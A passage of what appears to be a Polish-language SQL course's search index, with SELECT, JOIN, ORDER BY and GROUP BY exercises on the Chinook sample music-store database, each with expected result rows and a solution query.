Pami\u0119taj, \u017ce ka\u017cde zadanie mo\u017cna rozwi\u0105za\u0107 na kilka sposob\u00f3w. </p> <p>Danger</p> <p>Zajrzyj do przyk\u0142adowego rozwi\u0105zania dopiero, jak samodzielnie wykonasz zadanie.</p>"},{"location":"databases/sql/exercises/#przygotowanie","title":"Przygotowanie","text":"<p>W ramach \u0107wicze\u0144 b\u0119dziemy pracowa\u0107 z plikow\u0105 baz\u0105 danych SQLite. Zanim przyst\u0105pisz do \u0107wicze\u0144 przygotuj sobie \u015brodowisko pracy i zapoznaj si\u0119 z baz\u0105 danych, na kt\u00f3rej b\u0119dziesz pracowa\u0107.</p>"},{"location":"databases/sql/exercises/#narzedzie","title":"Narz\u0119dzie","text":"<p>Narz\u0119dzie, z kt\u00f3rym b\u0119dziemy pracowa\u0107 to poni\u017csza aplikacja webowa: </p> <p>SQLite Online</p> <p>Info</p> <p>Mo\u017cesz oczywi\u015bcie skorzysta\u0107 z innego narz\u0119dzia, pod warunkiem, \u017ce wiesz jak je samodzielnie skonfigurowa\u0107.</p>"},{"location":"databases/sql/exercises/#baza-danych","title":"Baza danych","text":"<p>Do \u0107wicze\u0144 wykorzystamy baz\u0119 danych Chinook. Jest to przyk\u0142adowa baza danych, jak\u0105 m\u00f3g\u0142by posiada\u0107 sklep online sprzedaj\u0105cy utwory muzyczne. </p> <p>W celu za\u0142adowania bazy Chinook w narz\u0119dziu SQLite Online wystarczy w okienku po lewej stronie (z napisem syntax) znale\u017a\u0107 linijk\u0119 \"Example: Chinook | NorthWind | cnf.db | BasketBall | Sakila\" i klikn\u0105\u0107 na nazw\u0119 Chinook. W\u00f3wczas baza danych b\u0119dzie ju\u017c za\u0142adowana, po lewej zobaczymy spis tabel, a po \u015brodku b\u0119dziemy mogli pisa\u0107 i wykonywa\u0107 zapytania.</p> <p>Baz\u0119 Chinook mo\u017cna tak\u017ce pobra\u0107 z poni\u017cszego linku:</p> <p>Baza Chinook</p> <p>Pobrany plik nale\u017cy rozpakowa\u0107. Je\u017celi chcemy za\u0142adowa\u0107 baz\u0119 do naszego narz\u0119dzia online to wybieramy z menu File-&gt;Open DB i wybieramy wypakowany plik chinook.sqlite.</p>"},{"location":"databases/sql/exercises/#struktura-bazy-danych","title":"Struktura bazy danych","text":"<p>Baza sk\u0142ada si\u0119 z 11 tabel:</p> <ul> <li>Employee - tabela przechowuj\u0105ca informacje o pracownikach, takie jak:</li> <li>id pracownika (EmployeeId), </li> <li>nazwisko (LastName), </li> <li>imi\u0119 (FirstName),</li> <li>itp.</li> <li>Customer - tabela przechowuj\u0105ca informacje o klientach.</li> <li>Invoice oraz InvoiceLine: dwie tabele przechowuj\u0105ce informacje o fakturach. Pierwsza przechowuje nag\u0142\u00f3wki faktur, a druga zakupione utwory.</li> <li>Artist - tabela przechowuj\u0105ca informacje o zespo\u0142ach. Zawiera jedynie nazw\u0119 zespo\u0142u oraz jego identyfikator.</li> <li>Album - tabela przechowuj\u0105ca informacje o albumach, czyli listach utwor\u00f3w. Ka\u017cdy album nale\u017cy do jednego artysty, ale jeden artysta mo\u017ce mie\u0107 wiele album\u00f3w.</li> <li>MediaType - tabela przechowuj\u0105ca informacje o typach plik\u00f3w audio, takie jak MPEG czy AAC.</li> <li>Genre - tabele przechowuj\u0105ca informacje o gatunkach, np. rock, jazz, metal.</li> <li>Track - tabela przechowuj\u0105ca informacje o utworach. Ka\u017cdy utw\u00f3r nale\u017cy do jednego albumu.</li> <li>Playlist oraz PlaylistTrack - tabele przechowuj\u0105ce informacje o playlistach. Ka\u017cda playlista zawiera list\u0119 utwor\u00f3w, a ka\u017cdy utw\u00f3r mo\u017ce nale\u017ce\u0107 do kilku playlist. Relacja pomi\u0119dzy tabelami playlists oraz tracks to relacja typu wiele-do-wielu, kt\u00f3ra zrealizowana jest za pomoc\u0105 tabeli playlist_track.</li> </ul> <p>Struktura bazy przedstawiona jest na poni\u017cszej grafice:</p> <pre><code>erDiagram\n  Album ||--o{ Artist : \"\"\n  Customer ||--o{ Employee : \"\"\n  Employee }o--o{ Employee : \"\"\n  Invoice ||--o{ Customer : \"\"\n  InvoiceLine ||--o{ Invoice : \"\"\n  Playlist }o--o{ PlaylistTrack : \"\"\n  PlaylistTrack }o--o{ Track : \"\"\n  Track ||--o{ Album : \"\"\n  Track ||--o{ Genre : \"\"\n  Track ||--o{ MediaType : \"\"\n  InvoiceLine ||--o{ Track : \"\"\n  Album {\n    INTEGER AlbumId\n    TEXT Title\n    INTEGER ArtistId\n  }\n  Artist {\n    INTEGER ArtistId\n    TEXT Name\n  }\n  Customer {\n    INTEGER CustomerId\n    TEXT FirstName\n    TEXT LastName\n    TEXT Company\n    TEXT Address\n    TEXT City\n    TEXT Country\n    TEXT PostalCode\n    TEXT Phone\n    TEXT Fax\n    TEXT Email\n    INTEGER SupportRepId\n  }\n  Employee {\n    INTEGER EmployeeId\n    TEXT LastName\n    TEXT FirstName\n    TEXT Title\n    INTEGER ReportsTo\n    NUMERIC BirthDate\n    NUMERIC HireDate\n    TEXT Address\n    TEXT City\n    TEXT State\n    TEXT Country\n    TEXT PostalCode\n    TEXT Phone\n    TEXT Fax\n    TEXT Email\n  }\n  Genre {\n    INTEGER GenreId\n    TEXT Name\n  }\n  Invoice {\n    INTEGER InvoiceId\n    TEXT CustomerId\n    NUMERIC InvoiceDate\n    TEXT BillingAddress\n    TEXT BillingCity\n    TEXT BillingState\n    TEXT BillingCountry\n    TEXT BillingPostalCode\n    REAL Total\n  }\n  InvoiceLine {\n    INTEGER InvoiceLineId\n    INTEGER InvoiceId\n    INTEGER TrackId\n    REAL UnitPrice\n    INTEGER Quantity\n  }\n  MediaType {\n    INTEGER MediaTypeId\n    TEXT Name\n  }\n  Playlist {\n    INTEGER PlaylistId\n    TEXT Name\n  }\n  PlaylistTrack {\n    INTEGER PlaylistId\n    INTEGER TrackId\n  }\n  Track {\n    INTEGER TrackId\n    TEXT Name\n    INTEGER AlbumId\n    INTEGER MediaTypeId\n    INTEGER GenreId\n    TEXT Composer\n    INTEGER Milliseconds\n    INTEGER Bytes\n    REAL UnitPrice\n  }</code></pre>"},{"location":"databases/sql/exercises/group-by/","title":"GROUP BY","text":""},{"location":"databases/sql/exercises/group-by/#zadanie-1","title":"Zadanie 1","text":"<p>Dla ka\u017cdego albumu wypisz jego tytu\u0142 oraz sum\u0119 d\u0142ugo\u015bci wszystkich jego utwor\u00f3w w milisekundach. Posortuj malej\u0105co po sumie d\u0142ugo\u015bci.</p>"},{"location":"databases/sql/exercises/group-by/#10-pierwszych-wierszy-wyniku","title":"10 pierwszych wierszy wyniku","text":"Title TracksLengthsSum Lost, Season 3 70665582 Battlestar Galactica (Classic), Season 1 70213784 Lost, Season 1 64854936 Lost, Season 2 63289631 Heroes, Season 1 59780268 Battlestar Galactica, Season 3 52787041 LOST, Season 4 39468433 The Office, Season 3 38317095 The Office, Season 2 28636206 Greatest Hits 15065731"},{"location":"databases/sql/exercises/group-by/#zadanie-2","title":"Zadanie 2","text":"<p>Dla ka\u017cdego artysty wypisz jego nazw\u0119 oraz sum\u0119 d\u0142ugo\u015bci wszystkich jego utwor\u00f3w w pe\u0142nych sekundach, w pe\u0142nych minutach i w pe\u0142nych godzinach. Posortuj rosn\u0105co po nazwie artysty.</p>"},{"location":"databases/sql/exercises/group-by/#10-pierwszych-wierszy-wyniku_1","title":"10 pierwszych wierszy wyniku","text":"Name Seconds Minutes Hours AC/DC 4853 80 1 Aaron Copland &amp; London Symphony Orchestra 198 3 0 Aaron Goldberg 266 4 0 Academy of St. Martin in the Fields &amp; Sir Neville Marriner 465 7 0 Academy of St. Martin in the Fields Chamber Ensemble &amp; Sir Neville Marriner 348 5 0 Academy of St. Martin in the Fields, John Birch, Sir Neville Marriner &amp; Sylvia McNair 258 4 0 Academy of St. Martin in the Fields, Sir Neville Marriner &amp; Thurston Dart 225 3 0 Accept 1200 20 0 Adrian Leaper &amp; Doreen de Feis 567 9 0 Aerosmith 4411 73 1"},{"location":"databases/sql/exercises/group-by/#zadanie-3","title":"Zadanie 3","text":"<p>Dla ka\u017cdej playlisty wypisz jej nazw\u0119 oraz liczb\u0119 utwor\u00f3w na niej zawartych. Posortuj malej\u0105co po liczbie utwor\u00f3w.</p>"},{"location":"databases/sql/exercises/group-by/#10-pierwszych-wierszy-wyniku_2","title":"10 pierwszych wierszy wyniku","text":"Name TracksCount Music 3290 Music 3290 90\u2019s Music 1477 TV Shows 213 TV Shows 213 Classical 75 Brazilian Music 39 Heavy Metal Classic 26 Classical 101 - The Basics 25 Classical 101 - Next Steps 25"},{"location":"databases/sql/exercises/group-by/#zadanie-4","title":"Zadanie 4","text":"<p>Wypisz nazw\u0119 oraz liczb\u0119 utwor\u00f3w playlisty/playlist z najmniejsz\u0105 liczb\u0105 utwor\u00f3w.</p>"},{"location":"databases/sql/exercises/group-by/#wynik","title":"Wynik","text":"Name TracksCount Music Videos 1 On-The-Go 1 1"},{"location":"databases/sql/exercises/group-by/#zadanie-5","title":"Zadanie 5","text":"<p>Wypisz nazw\u0119 i czas trwania najkr\u00f3tszej (pod wzgl\u0119dem czasu trwania) playlisty.</p>"},{"location":"databases/sql/exercises/group-by/#wynik_1","title":"Wynik","text":"Name MillisecondsTotalLength On-The-Go 1 197459"},{"location":"databases/sql/exercises/group-by/#zadanie-6","title":"Zadanie 6","text":"<p>Dla ka\u017cdego klienta wypisz jego imi\u0119, nazwisko oraz sumaryczny koszt wszystkich jego faktur zaokr\u0105glony do dw\u00f3ch miejsc po przecinku. Posortuj rosn\u0105co po nazwiskach.</p>"},{"location":"databases/sql/exercises/group-by/#10-pierwszych-wierszy-wyniku_3","title":"10 pierwszych wierszy wyniku","text":"FirstName LastName TotalCost Roberto Almeida 37.62 Julia Barnett 43.62 Camille Bernard 38.62 Michelle Brooks 37.62 Robert Brown 37.62 Kathy Chase 37.62 Richard Cunningham 47.62 Marc Dubois 37.62 Jo\u00e3o Fernandes 39.62 Edward Francis 37.62"},{"location":"databases/sql/exercises/group-by/solution-1/","title":"Zadanie 1 - rozwi\u0105zanie","text":"<pre><code>SELECT Title, SUM(Milliseconds) AS TracksLengthsSum FROM Album JOIN Track USING(AlbumId) GROUP BY Album.AlbumId ORDER BY TracksLengthsSum DESC;\n</code></pre>"},{"location":"databases/sql/exercises/group-by/solution-2/","title":"Zadanie 2 - rozwi\u0105zanie","text":"<pre><code>SELECT Artist.Name, SUM(Milliseconds)/(1000) AS Seconds, SUM(Milliseconds)/(1000*60) AS Minutes, SUM(Milliseconds)/(1000*60*60) AS Hours FROM Album JOIN Track USING(AlbumId) JOIN Artist USING(ArtistId) GROUP BY Artist.ArtistId ORDER BY Artist.Name ASC;\n</code></pre>"},{"location":"databases/sql/exercises/group-by/solution-3/","title":"Zadanie 3 - rozwi\u0105zanie","text":"<pre><code>SELECT Playlist.Name, Count(Track.TrackId) AS TracksCount FROM Playlist JOIN PlaylistTrack USING(PlaylistId) JOIN Track USING(TrackId) GROUP BY Playlist.PlaylistId ORDER BY TracksCount DESC;\n</code></pre>"},{"location":"databases/sql/exercises/group-by/solution-4/","title":"Zadanie 4 - rozwi\u0105zanie","text":"<pre><code>SELECT Playlist.Name, Count(Track.TrackId) AS TracksCount FROM Playlist JOIN PlaylistTrack USING(PlaylistId) JOIN Track USING(TrackId) GROUP BY Playlist.PlaylistId ORDER BY TracksCount ASC LIMIT 2;\n</code></pre>"},{"location":"databases/sql/exercises/group-by/solution-5/","title":"Zadanie 5 - rozwi\u0105zanie","text":"<pre><code>SELECT Playlist.Name, SUM(Track.Milliseconds) AS MillisecondsTotalLength FROM Playlist JOIN PlaylistTrack USING(PlaylistId) JOIN Track USING(TrackId) GROUP BY Playlist.PlaylistId ORDER BY MillisecondsTotalLength ASC LIMIT 1;\n</code></pre>"},{"location":"databases/sql/exercises/group-by/solution-6/","title":"Zadanie 6 - rozwi\u0105zanie","text":"<pre><code>SELECT FirstName, LastName, ROUND(SUM(Total), 2) AS TotalCost FROM Customer JOIN Invoice USING(CustomerId) GROUP BY Customer.CustomerId ORDER BY LastName ASC;\n</code></pre>"},{"location":"databases/sql/exercises/join/","title":"JOIN","text":""},{"location":"databases/sql/exercises/join/#zadanie-1","title":"Zadanie 1","text":"<p>Utw\u00f3rz zestawienie zawieraj\u0105ce imi\u0119 artysty i nazw\u0119 jego albumu.</p>"},{"location":"databases/sql/exercises/join/#10-pierwszych-wierszy-wyniku","title":"10 pierwszych wierszy wyniku","text":"Name Title AC/DC For Those About To Rock We Salute You Accept Balls to the Wall Accept Restless and Wild AC/DC Let There Be Rock Aerosmith Big Ones Alanis Morissette Jagged Little Pill Alice In Chains Facelift Ant\u00c3\u00b4nio Carlos Jobim Warner 25 Anos Apocalyptica Plays Metallica By Four Cellos Audioslave Audioslave"},{"location":"databases/sql/exercises/join/#zadanie-2","title":"Zadanie 2","text":"<p>Dla ka\u017cdego utworu wypisz jego gatunek.</p>"},{"location":"databases/sql/exercises/join/#10-pierwszych-wierszy-wyniku_1","title":"10 pierwszych wierszy wyniku","text":"Name Name For Those About To Rock (We Salute You) Rock Balls to the Wall Rock Fast As a Shark Rock Restless and Wild Rock Princess of the Dawn Rock Put The Finger On You Rock Let's Get It Up Rock Inject The Venom Rock Snowballed Rock Evil Walks Rock"},{"location":"databases/sql/exercises/join/#zadanie-3","title":"Zadanie 3","text":"<p>Dla ka\u017cdego utworu wypisz nazw\u0119 albumu, do kt\u00f3rego nale\u017cy.</p>"},{"location":"databases/sql/exercises/join/#10-pierwszych-wierszy-wyniku_2","title":"10 pierwszych wierszy wyniku","text":"Name Title For Those About To Rock (We Salute You) For Those About To Rock We Salute You Balls to the Wall Balls to the Wall Fast As a Shark Restless and Wild Restless and Wild Restless and Wild Princess of the Dawn Restless and Wild Put The Finger On You For Those About To Rock We Salute You Let's Get It Up For Those About To Rock We Salute You Inject The Venom For Those About To Rock We Salute You Snowballed For Those About To Rock We Salute You Evil Walks For Those About To Rock We Salute You"},{"location":"databases/sql/exercises/join/#zadanie-4","title":"Zadanie 4","text":"<p>Utw\u00f3rz zestawienie zawieraj\u0105ce nazw\u0119 utworu i nazw\u0119 playlisty, na kt\u00f3rej on wyst\u0119puje.</p>"},{"location":"databases/sql/exercises/join/#10-pierwszych-wierszy-wyniku_3","title":"10 pierwszych wierszy wyniku","text":"Name Name Band Members Discuss Tracks from \"Revelations\" Music Revelations Music One and the Same Music Sound of a Gun Music Until We Fall Music Original Fire Music Broken City Music Somedays Music Shape of Things to Come Music Jewel of the Summertime Music"},{"location":"databases/sql/exercises/join/#zadanie-5","title":"Zadanie 5","text":"<p>Dla ka\u017cdego artysty wypisz wszystkie gatunki, w kt\u00f3rych opublikowa\u0142 on albumy.</p>"},{"location":"databases/sql/exercises/join/#10-pierwszych-wierszy-wyniku_4","title":"10 pierwszych wierszy wyniku","text":"Name Name AC/DC Rock Accept Rock Aerosmith Rock Alanis Morissette Rock Alice In Chains Rock Ant\u00c3\u00b4nio Carlos Jobim Jazz Apocalyptica Metal Audioslave Rock Audioslave Alternative &amp; Punk BackBeat Rock And Roll"},{"location":"databases/sql/exercises/join/#zadanie-6","title":"Zadanie 6","text":"<p>Wypisz wszystkie albumy zespo\u0142u Black Sabbath.</p>"},{"location":"databases/sql/exercises/join/#wynik","title":"Wynik","text":"Title Black Sabbath Black Sabbath Vol. 4 (Remaster)"},{"location":"databases/sql/exercises/join/#zadanie-7","title":"Zadanie 7","text":"<p>Utw\u00f3rz zestawienie zawieraj\u0105ce nazw\u0119 utworu oraz tytu\u0142 albumu wszystkich utwor\u00f3w ze wszystkich album\u00f3w zespo\u0142u Black Sabbath.</p>"},{"location":"databases/sql/exercises/join/#10-pierwszych-wierszy-wyniku_5","title":"10 pierwszych wierszy wyniku","text":"Title Name Black Sabbath Black Sabbath Black Sabbath The Wizard Black Sabbath Behind The Wall Of Sleep Black Sabbath N.I.B. Black Sabbath Evil Woman Black Sabbath Sleeping Village Black Sabbath Warning Black Sabbath Vol. 4 (Remaster) Wheels Of Confusion / The Straightener Black Sabbath Vol. 4 (Remaster) Tomorrow's Dream Black Sabbath Vol. 4 (Remaster) Changes"},{"location":"databases/sql/exercises/join/#zadanie-8","title":"Zadanie 8","text":"<p>Dla ka\u017cdego klienta wypisz jego imi\u0119 i nazwisko oraz imi\u0119 i nazwisko przypisanego do niego pracownika.</p>"},{"location":"databases/sql/exercises/join/#10-pierwszych-wierszy-wyniku_6","title":"10 pierwszych wierszy wyniku","text":"CustomerFirstName CustomerLastName EmployeeFirstName EmployeeLastName Lu\u00eds Gon\u00e7alves Jane Peacock Leonie K\u00f6hler Steve Johnson Fran\u00e7ois Tremblay Jane Peacock Bj\u00f8rn Hansen Margaret Park Franti\u0161ek Wichterlov\u00e1 Margaret Park Helena Hol\u00fd Steve Johnson Astrid Gruber Steve Johnson Daan Peeters Margaret Park Kara Nielsen Margaret Park Eduardo Martins Margaret Park"},{"location":"databases/sql/exercises/join/#zadanie-9","title":"Zadanie 9","text":"<p>Dla ka\u017cdej faktury wypisz jej dat\u0119 oraz imi\u0119 i nazwisko klienta do niej przypisanego. Posortuj malej\u0105co po dacie wystawienia faktury.</p>"},{"location":"databases/sql/exercises/join/#10-pierwszych-wierszy-wyniku_7","title":"10 pierwszych wierszy wyniku","text":"InvoiceDate FirstName LastName 2013-12-22 00:00:00 Manoj Pareek 2013-12-14 00:00:00 Terhi H\u00e4m\u00e4l\u00e4inen 2013-12-09 00:00:00 Madalena Sampaio 2013-12-06 00:00:00 Robert Brown 2013-12-05 00:00:00 Victor Stevens 2013-12-04 00:00:00 Kathy Chase 2013-12-04 00:00:00 John Gordon 2013-11-21 00:00:00 Dan Miller 2013-11-13 00:00:00 Helena Hol\u00fd 2013-11-08 00:00:00 Diego Guti\u00e9rrez"},{"location":"databases/sql/exercises/join/#zadanie-10","title":"Zadanie 10","text":"<p>Dla ka\u017cdej faktury wypisz jej dat\u0119 oraz nazwy wszystkich utwor\u00f3w na tej fakturze.</p>"},{"location":"databases/sql/exercises/join/#10-pierwszych-wierszy-wyniku_8","title":"10 pierwszych wierszy wyniku","text":"InvoiceDate Name 2009-01-01 00:00:00 Balls to the Wall 2009-01-01 00:00:00 Restless and Wild 2009-01-02 00:00:00 Put The Finger On You 2009-01-02 00:00:00 Inject The Venom 2009-01-02 00:00:00 Evil Walks 2009-01-02 00:00:00 Breaking The Rules 2009-01-03 00:00:00 Dog Eat Dog 2009-01-03 00:00:00 Overdose 2009-01-03 00:00:00 Love In An Elevator 2009-01-03 00:00:00 Janie's Got A Gun"},{"location":"databases/sql/exercises/join/solution-1/","title":"Zadanie 1 - rozwi\u0105zanie","text":"<pre><code>SELECT Name, Title FROM Album JOIN Artist USING(ArtistId);\n</code></pre>"},{"location":"databases/sql/exercises/join/solution-10/","title":"Zadanie 10 - rozwi\u0105zanie","text":"<pre><code>SELECT InvoiceDate, Name FROM Invoice JOIN InvoiceLine USING(InvoiceId) JOIN Track USING(TrackId);\n</code></pre>"},{"location":"databases/sql/exercises/join/solution-2/","title":"Zadanie 2 - rozwi\u0105zanie","text":"<pre><code>SELECT Track.Name, Genre.Name FROM Track JOIN Genre USING(GenreId);\n</code></pre>"},{"location":"databases/sql/exercises/join/solution-3/","title":"Zadanie 3 - rozwi\u0105zanie","text":"<pre><code>SELECT Name, Title FROM Track JOIN Album USING(AlbumId);\n</code></pre>"},{"location":"databases/sql/exercises/join/solution-4/","title":"Zadanie 4 - rozwi\u0105zanie","text":"<pre><code>SELECT Track.Name, Playlist.Name FROM Track JOIN PlaylistTrack USING(TrackId) JOIN Playlist USING(PlaylistId);\n</code></pre>"},{"location":"databases/sql/exercises/join/solution-5/","title":"Zadanie 5 - rozwi\u0105zanie","text":"<pre><code>SELECT DISTINCT Artist.Name, Genre.Name FROM Artist JOIN Album USING(ArtistId) JOIN Track USING(AlbumId) JOIN Genre USING(GenreId);\n</code></pre>"},{"location":"databases/sql/exercises/join/solution-6/","title":"Zadanie 6 - rozwi\u0105zanie","text":"<pre><code>SELECT Title FROM Artist JOIN Album USING(ArtistId) WHERE Name='Black Sabbath';\n</code></pre>"},{"location":"databases/sql/exercises/join/solution-7/","title":"Zadanie 7 - rozwi\u0105zanie","text":"<pre><code>SELECT Title, Track.Name FROM Artist JOIN Album USING(ArtistId) JOIN Track USING(AlbumId) WHERE Artist.Name='Black Sabbath';\n</code></pre>"},{"location":"databases/sql/exercises/join/solution-8/","title":"Zadanie 8 - rozwi\u0105zanie","text":"<pre><code>SELECT Customer.FirstName AS CustomerFirstName, Customer.LastName AS CustomerLastName, Employee.FirstName AS EmployeeFirstName, Employee.LastName AS EmployeeLastName FROM Customer JOIN Employee ON(Customer.SupportRepId=Employee.EmployeeId);\n</code></pre>"},{"location":"databases/sql/exercises/join/solution-9/","title":"Zadanie 9 - rozwi\u0105zanie","text":"<pre><code>SELECT InvoiceDate, FirstName, LastName FROM Invoice JOIN Customer USING(CustomerId) ORDER BY InvoiceDate DESC;\n</code></pre>"},{"location":"databases/sql/exercises/order-by/","title":"ORDER BY","text":""},{"location":"databases/sql/exercises/order-by/#zadanie-1","title":"Zadanie 1","text":"<p>Dla ka\u017cdego pracownika wypisz jego imi\u0119 i nazwisko oraz dat\u0119 urodzenia. Posortuj rosn\u0105co po dacie urodzenia.</p>"},{"location":"databases/sql/exercises/order-by/#10-pierwszych-wierszy-wyniku","title":"10 pierwszych wierszy wyniku","text":"FirstName LastName BirthDate Margaret Park 1947-09-19 00:00:00 Nancy Edwards 1958-12-08 00:00:00 Andrew Adams 1962-02-18 00:00:00 Steve Johnson 1965-03-03 00:00:00 Laura Callahan 1968-01-09 00:00:00 Robert King 1970-05-29 00:00:00 Michael Mitchell 1973-07-01 00:00:00 Jane Peacock 1973-08-29 00:00:00"},{"location":"databases/sql/exercises/order-by/#zadanie-2","title":"Zadanie 2","text":"<p>Dla ka\u017cdego utworu wypisz jego nazw\u0119 i d\u0142ugo\u015b\u0107 trwania w pe\u0142nych minutach. Posortuj malej\u0105co po d\u0142ugo\u015bci trwania.</p>"},{"location":"databases/sql/exercises/order-by/#10-pierwszych-wierszy-wyniku_1","title":"10 pierwszych wierszy wyniku","text":"Name Minutes Occupation / Precipice 88 Through a Looking Glass 84 Battlestar Galactica, Pt. 1 49 Battlestar Galactica, Pt. 2 49 The Man With Nine Lives 49 Greetings from Earth, Pt. 1 49 Battlestar Galactica, Pt. 3 48 Lost Planet of the Gods, Pt. 1 48 Lost Planet of the Gods, Pt. 2 48 The Lost Warrior 48"},{"location":"databases/sql/exercises/order-by/#zadanie-3","title":"Zadanie 3","text":"<p>Dla ka\u017cdego utworu wypisz jego nazw\u0119 i d\u0142ugo\u015b\u0107 trwania w pe\u0142nych minutach. Posortuj rosn\u0105co po d\u0142ugo\u015bci trwania i malej\u0105co po nazwie.</p>"},{"location":"databases/sql/exercises/order-by/#10-pierwszych-wierszy-wyniku_2","title":"10 pierwszych wierszy wyniku","text":"Name Minutes \u00c9tude 1, In C Major - Preludio (Presto) - Liszt 0 \u00c9 Uma Partida De Futebol 0 Wasted Reprise 0 The Star Spangled Banner 0 The Real Problem 0 The Hellion 0 Smoked Pork 0 Pol\u00edcia (Vinheta) 0 Oprah 0 Now Sports 0"},{"location":"databases/sql/exercises/order-by/#zadanie-4","title":"Zadanie 4","text":"<p>Wypisz imi\u0119, nazwisko, miasto i kraj ka\u017cdego klienta. Posortuj rosn\u0105co po kraju, malej\u0105co po mie\u015bcie i rosn\u0105co po nazwisku.</p>"},{"location":"databases/sql/exercises/order-by/#10-pierwszych-wierszy-wyniku_3","title":"10 pierwszych wierszy wyniku","text":"FirstName LastName City Country Diego Guti\u00e9rrez Buenos Aires Argentina Mark Taylor Sidney Australia Astrid Gruber Vienne Austria Daan Peeters Brussels Belgium Eduardo Martins S\u00e3o Paulo Brazil Alexandre Rocha S\u00e3o Paulo Brazil Lu\u00eds Gon\u00e7alves S\u00e3o Jos\u00e9 dos Campos Brazil Roberto Almeida Rio de Janeiro Brazil Fernanda Ramos Bras\u00edlia Brazil Ellie Sullivan Yellowknife Canada"},{"location":"databases/sql/exercises/order-by/#zadanie-5","title":"Zadanie 5","text":"<p>Wypisz tytu\u0142 i d\u0142ugo\u015b\u0107 trwania \\(10\\) najd\u0142u\u017cszych utwor\u00f3w.</p>"},{"location":"databases/sql/exercises/order-by/#wynik","title":"Wynik","text":"Name Milliseconds Occupation / Precipice 5286953 Through a Looking Glass 5088838 Greetings from Earth, Pt. 1 2960293 The Man With Nine Lives 2956998 Battlestar Galactica, Pt. 2 2956081 Battlestar Galactica, Pt. 1 2952702 Murder On the Rising Star 2935894 Battlestar Galactica, Pt. 3 2927802 Take the Celestra 2927677 Fire In Space 2926593"},{"location":"databases/sql/exercises/order-by/#zadanie-6","title":"Zadanie 6","text":"<p>Wypisz tytu\u0142 i d\u0142ugo\u015b\u0107 trwania najkr\u00f3tszego utworu.</p>"},{"location":"databases/sql/exercises/order-by/#wynik_1","title":"Wynik","text":"Name Milliseconds \u00c9 Uma Partida De Futebol 1071"},{"location":"databases/sql/exercises/order-by/solution-1/","title":"Zadanie 1 - rozwi\u0105zanie","text":"<pre><code>SELECT FirstName, LastName, BirthDate FROM Employee ORDER BY BirthDate ASC;\n</code></pre>"},{"location":"databases/sql/exercises/order-by/solution-2/","title":"Zadanie 2 - rozwi\u0105zanie","text":"<pre><code>SELECT Name, Milliseconds/(1000*60) AS Minutes FROM Track ORDER BY Minutes DESC;\n</code></pre>"},{"location":"databases/sql/exercises/order-by/solution-3/","title":"Zadanie 3 - rozwi\u0105zanie","text":"<pre><code>SELECT Name, Milliseconds/(1000*60) AS Minutes FROM Track ORDER BY Minutes ASC, Name DESC;\n</code></pre>"},{"location":"databases/sql/exercises/order-by/solution-4/","title":"Zadanie 4 - rozwi\u0105zanie","text":"<pre><code>SELECT FirstName, LastName, City, Country FROM Customer ORDER BY Country ASC, City DESC, LastName ASC;\n</code></pre>"},{"location":"databases/sql/exercises/order-by/solution-5/","title":"Zadanie 5 - rozwi\u0105zanie","text":"<pre><code>SELECT Name, Milliseconds FROM Track ORDER BY Milliseconds DESC LIMIT 10;\n</code></pre>"},{"location":"databases/sql/exercises/order-by/solution-6/","title":"Zadanie 6 - rozwi\u0105zanie","text":"<pre><code>SELECT Name, Milliseconds FROM Track ORDER BY Milliseconds ASC LIMIT 1;\n</code></pre>"},{"location":"databases/sql/exercises/select/","title":"SELECT","text":""},{"location":"databases/sql/exercises/select/#zadanie-1","title":"Zadanie 1","text":"<p>Wypisz wszystkich artyst\u00f3w.</p>"},{"location":"databases/sql/exercises/select/#10-pierwszych-wierszy-wyniku","title":"10 pierwszych wierszy wyniku","text":"ArtistId Name 1 AC/DC 2 Accept 3 Aerosmith 4 Alanis Morissette 5 Alice In Chains 6 Ant\u00c3\u00b4nio Carlos Jobim 7 Apocalyptica 8 Audioslave 9 BackBeat 10 Billy Cobham"},{"location":"databases/sql/exercises/select/#zadanie-2","title":"Zadanie 2","text":"<p>Wypisz tytu\u0142y wszystkich album\u00f3w.</p>"},{"location":"databases/sql/exercises/select/#10-pierwszych-wierszy-wyniku_1","title":"10 pierwszych wierszy wyniku","text":"Title For Those About To Rock We Salute You Balls to the Wall Restless and Wild Let There Be Rock Big Ones Jagged Little Pill Facelift Warner 25 Anos Plays Metallica By Four Cellos Audioslave"},{"location":"databases/sql/exercises/select/#zadanie-3","title":"Zadanie 3","text":"<p>Dla ka\u017cdego utworu wypisz jego nazw\u0119 i d\u0142ugo\u015b\u0107 trwania w milisekundach.</p>"},{"location":"databases/sql/exercises/select/#10-pierwszych-wierszy-wyniku_2","title":"10 pierwszych wierszy wyniku","text":"Name Milliseconds For Those About To Rock (We Salute You) 343719 Balls to the Wall 342562 Fast As a Shark 230619 Restless and Wild 252051 Princess of the Dawn 375418 Put The Finger On You 205662 Let's Get It Up 233926 Inject The Venom 210834 Snowballed 203102 Evil Walks 263497"},{"location":"databases/sql/exercises/select/#zadanie-4","title":"Zadanie 4","text":"<p>Dla ka\u017cdego utworu wypisz jego nazw\u0119 i d\u0142ugo\u015b\u0107 trwania w pe\u0142nych minutach.</p>"},{"location":"databases/sql/exercises/select/#10-pierwszych-wierszy-wyniku_3","title":"10 pierwszych wierszy wyniku","text":"Name Minutes For Those About To Rock (We Salute You) 5 Balls to the Wall 5 Fast As a Shark 3 Restless and Wild 4 Princess of the Dawn 6 Put The Finger On You 3 Let's Get It Up 3 Inject The Venom 3 Snowballed 3 Evil Walks 4"},{"location":"databases/sql/exercises/select/#zadanie-5","title":"Zadanie 5","text":"<p>Utw\u00f3rz zestawienie zawieraj\u0105ce nazw\u0119 utworu oraz jego d\u0142ugo\u015b\u0107 trwania w milisekundach, pe\u0142nych sekundach, pe\u0142nych minutach i pe\u0142nych godzinach. Nadaj kolumnom czytelne i odpowiednie nazwy.</p>"},{"location":"databases/sql/exercises/select/#10-pierwszych-wierszy-wyniku_4","title":"10 pierwszych wierszy wyniku","text":"Name Milliseconds Seconds Minutes Hours For Those About To Rock (We Salute You) 343719 343 5 0 Balls to the Wall 342562 342 5 0 Fast As a Shark 230619 230 3 0 Restless and Wild 252051 252 4 0 Princess of the Dawn 375418 375 6 0 Put The Finger On You 205662 205 3 0 Let's Get It Up 233926 233 3 0 Inject The Venom 210834 210 3 0 Snowballed 203102 203 3 0 Evil Walks 263497 263 4 0"},{"location":"databases/sql/exercises/select/#zadanie-6","title":"Zadanie 6","text":"<p>Dla ka\u017cdego pracownika wypisz jego imi\u0119 i nazwisko oraz dat\u0119 urodzenia.</p>"},{"location":"databases/sql/exercises/select/#10-pierwszych-wierszy-wyniku_5","title":"10 pierwszych wierszy wyniku","text":"FirstName 